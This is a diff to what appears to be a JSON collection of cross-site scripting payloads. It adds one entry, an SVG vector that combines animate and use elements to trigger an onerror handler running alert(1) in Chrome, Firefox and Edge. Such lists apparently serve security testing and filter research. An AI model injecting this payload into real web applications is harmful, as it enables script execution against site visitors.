@@ -230,5 +230,14 @@
             "firefox",
             "edge"
         ]
+    },
+    {
+        "description": "Animate tag with auto executing use element",
+        "code": "<svg><animate xlink:href=\"#x\" attributeName=\"href\" values=\"data:image\/svg+xml,&lt;svg id='x' xmlns='http:\/\/www.w3.org\/2000\/svg'&gt;&lt;image href='1' onerror='alert(1)' \/&gt;&lt;\/svg&gt;#x\" \/><use id=x \/>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge"
+        ]
     }
 ]
